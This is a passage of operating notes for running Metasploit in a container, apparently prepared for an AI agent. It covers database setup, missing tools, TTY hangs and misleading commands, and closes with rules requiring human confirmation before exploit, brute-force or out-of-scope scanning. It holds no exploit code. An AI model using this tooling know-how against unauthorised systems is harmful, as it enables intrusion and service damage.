  msfconsole -q -y /tmp/msfhome/.msf4/database.yml -x 'db_status; exit' </dev/null
  # → [*] Connected to msf. Connection type: postgresql.  (verified)
  ```

  `setpriv` is present (`/usr/bin/setpriv`); uid 1000 is the image's `node`
  user. `msfdb status` as that user reports `Database started`. Pointing `HOME`
  at a directory under the bind-mounted working directory works the same way
  and survives container recreation (**unverified** — only the `/tmp` path was
  executed); postgres is not started at container start either way, so
  `msfdb start` (again as the non-root user) is part of the recipe. Without
  this, every `services`/`hosts`/`creds`/`db_export` command fails with
  `[-] Database not connected`.
- **Ruby/omnibus self-containment.** The framework uses
  `/opt/metasploit-framework/embedded/bin/ruby` (3.4.4). The Debian `ruby` on
  `PATH` (3.1.2) is unrelated and irrelevant to module behaviour — but `msfdb`
  prints `WARN: Unresolved or ambiguous specs during Gem::Specification.reset:
  base64 (>= 0.2) / logger (~> 1.6)` from the embedded gem environment on every
  run (verified: 2 lines from `msfdb`, 0 from `msfconsole` and `msfvenom`).
  Cosmetic; discard stderr.
- **Missing external tools.** Present: `nmap` (7.93, used by `db_nmap`), `gcc`,
  `make`, `python3` (venv), `sqlmap`, `nc`, `curl`, `openssl`, `git`, `ping`,
  `od`, `hexdump` (`/usr/bin/hexdump`). **Absent**: `nasm`, `java`, `xxd` — use
  `od -An -v -tx1` for byte inspection, and expect modules that need an
  assembler or a JVM to fail at run time rather than at startup
  (**unverified** which modules fail; only the absence of the binaries was
  verified).
- **No login-shell assumptions.** The `/usr/bin` entry points are
  update-alternatives symlinks and the wrappers fix up `PATH`/`GEM_*`
  themselves; `/etc/profile.d` is empty. `docker exec … bash -c 'msfconsole …'`
  works without `-l`.
- **Memory and time.** A trivial console session peaked at **167 MB RSS** with
  `sleep 5` as the workload (verified via `VmHWM`); expect 300–600 MB for
  module-heavy work, plus ~100 MB per background handler. `/opt/metasploit-framework`
  is 994 MB on disk; the test image is 9.51 GB. Serialise console runs — handler
  ports cannot be shared, and each console re-reads the 12 MB module store.
- **Things that hang without a TTY.** `msfconsole` with an open stdin and no
  `exit` (verified: `sleep 60 | msfconsole -q` never returned, killed at 10 s by
  `timeout`, rc=124); `sessions -i <id>`; `msfdb reinit`/`delete` without
  `--use-defaults` (they ask `Would you like to delete your existing data and
  configurations?`); `info -d`, which generates an HTML file in `/tmp` and then
  tries to open a browser (`[*] Generating documentation for … then opening
  /tmp/<module>_doc<date>.html in a browser...`) — read the module's markdown
  under
  `/opt/metasploit-framework/embedded/framework/documentation/modules/<path>.md`
  instead.
- **Commands that do not behave as their name suggests.** `loot -o FILE` is
  not an export (no `-o`; it is parsed as a host and fails with
  `[-] Invalid host parameter`). `-o FILE` on `msfconsole` redirects rather than
  tees, and it breaks `spool` outright. `db_stats -h` executes the stats instead
  of printing help. `db_export -h` prints usage then
  `[-] No output file was specified`. `notes -a …` succeeds but emits a Ruby
  deprecation stack trace on stderr (`[DEPRECATION] Using report_note with a
  non-hash data value…`, verified on the previous build of this image).
  `setg -h` prints `-h => `.
- **Jobs and sessions are process-local.** A handler started with `run -j` or
  `handler` disappears when that console exits; a listener that must survive a
  multi-step workflow needs its own background console process.
- **Auto-detected values are environment-specific.** `LHOST` defaulted to the
  container's bridge address (`172.17.0.5`) in the test container; in the agent
  container it will be the tunnel-side address. Always `set LHOST` explicitly
  from `ip -4 addr` rather than accepting the default, and expect the warning
  `[!] You are binding to a loopback address …` if it points at loopback.

## Safety and scope

Never run these without explicit human confirmation for the specific target and
the specific module:

- **Exploit modules** (`exploit/*`, `run`/`exploit`/`rexploit`/`rerun`). They
  can crash services, corrupt data, and leave a session — a session on a
  production host is an incident, not a finding.
- **Brute-force and credential-attack modules** (`auxiliary/scanner/*` with
  authentication, `auxiliary/admin/*` login modules, anything setting
  `PASS_FILE`, `USER_FILE`, `BRUTEFORCE_SPEED`). They lock accounts and trigger
  alarms.
- **Scanner modules and `db_nmap`** against anything outside the confirmed
  scope — a scanner pointed at a /24 that was not authorized is a scope
  violation even though nothing is "exploited".
- **Payload generation is safe; payload delivery is not.** `msfvenom` writes a
  file and touches nothing. Uploading it, running it on a host, or hosting it
  for a target is the exploit step.
- **Session commands that change the target** (`sessions -u`, post modules,
  `sessions -c` with anything mutating) — treat them like exploits.

The reason for `check`-first is not politeness: an exploit that does not need
to run is a risk with no upside, and a check result is evidence a hypothesis was
tested rather than a guess that happened to fire. When a check is inconclusive,
record that and go back to recon — do not escalate to `exploit` to "see what
happens".
